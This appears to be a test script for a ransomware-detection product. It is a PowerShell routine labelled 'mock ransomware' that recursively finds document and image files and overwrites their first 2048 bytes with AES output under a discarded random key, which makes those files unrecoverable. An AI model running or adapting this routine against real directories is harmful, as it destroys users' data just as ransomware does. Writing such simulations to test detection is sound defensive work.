<#
    Mock ransomware behavior.
#>

param(
    # Filepath of the directory to target.
    [Parameter(Mandatory = $true)][string]$path,

    # Delay in seconds to wait for to help address race conditions in the tester.
    [Parameter(Mandatory = $false)][int]$delay = 60,

    # Maximum number of files to overwrite.
    [Parameter(Mandatory = $false)][int]$maxFiles = 90
)

$randomBytes1 = ([Char[]](Get-Random -Input $(48..57 + 65..90 + 97..122) -Count 50)) -join ""
$randomBytes2 = ([Char[]](Get-Random -Input $(48..57 + 65..90 + 97..122) -Count 20)) -join ""
[byte[]]$fileContents = [system.Text.Encoding]::Unicode.GetBytes($randomBytes1)
$utf8RandomBytes = [Text.Encoding]::UTF8.GetBytes($randomBytes2)

$cryptoObject = new-Object System.Security.Cryptography.RijndaelManaged
$cryptoObject.Key = (new-Object Security.Cryptography.Rfc2898DeriveBytes $randomBytes1, $utf8RandomBytes, 5).GetBytes(32)
$cryptoObject.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash([Text.Encoding]::UTF8.GetBytes("alle") )[0..15]
$cryptoObject.Padding = "Zeros"
$cryptoObject.Mode = "CBC"

$files = Get-ChildItem -Path $path -Include *.doc, *.jpg, *.gif, *.pdf, *.docx, *.txt -Recurse
$count = 0

foreach ($file in $files) {
    if ($count -ge $maxFiles) {
        Write-Host "Count $count has exceeded maxFiles $maxFiles"
        break
    }
    try {
        Write-Host $file
        $fileReader = New-Object System.IO.BinaryReader([System.IO.File]::Open(
                $file, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite,
                [System.IO.FileShare]::Read), [System.Text.Encoding]::ASCII)

        if ($fileReader.BaseStream.Length -lt 2048) {
            return
        }

        # files must be larger than 2048 bytes to be subjected to the encryption
        $readLength = 2048

        $fileContents = $fileReader.ReadBytes($readLength)
        $fileReader.Close()
        $encryptorObject = $cryptoObject.CreateEncryptor()
        $memStream = new-Object IO.MemoryStream
        $cryptoStream = new-Object Security.Cryptography.CryptoStream $memStream, $encryptorObject, "Write"
        $cryptoStream.Write($fileContents, 0, $fileContents.Length)
        $cryptoStream.Close()
        $memStream.Close()
        $encryptorObject.Clear()
        $arrayContents = $memStream.ToArray()

        # The byte 0x44 has been chosen to be the first byte of the high entropy buffer
        # because it does not match the beginning of any known magic byte sequence.
        # Some file types like .doc can have a single byte to match against their magic
        # bytes sequence, which will results on a non header mismatch during lua detection,
        # as a consequence, the score won't reach the required threshold, and hence no alert
        # being generated.
        $arrayContents[0] = 0x44

        $binaryWriter = New-Object System.IO.BinaryWriter([System.IO.File]::Open($file,
                [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite,
                [System.IO.FileShare]::Read), [System.Text.Encoding]::ASCII)

        # If the file is a .txt file then only overwrite first few chars.
        # This will cause an empty "metrics" array and will therefore
        # test for any regressions caused by this behavior e.g. ES rejecting alerts.
        $fileExtension = [IO.Path]::GetExtension($file)
        if ($fileExtension -eq ".txt") {
            $binaryWriter.Write("MOCKTEST")
        }
        else {
            $binaryWriter.Write($arrayContents, 0, $arrayContents.Length)
        }
        $binaryWriter.Close()
        Start-Sleep -m 20
    }
    catch {
        Write-Output $_.Exception | format-list -force
    }
    $count++
}

# Wait specified delay to help address potential race conditions in the tester
Write-Host "Sleeping for $delay seconds"
Start-Sleep $delay
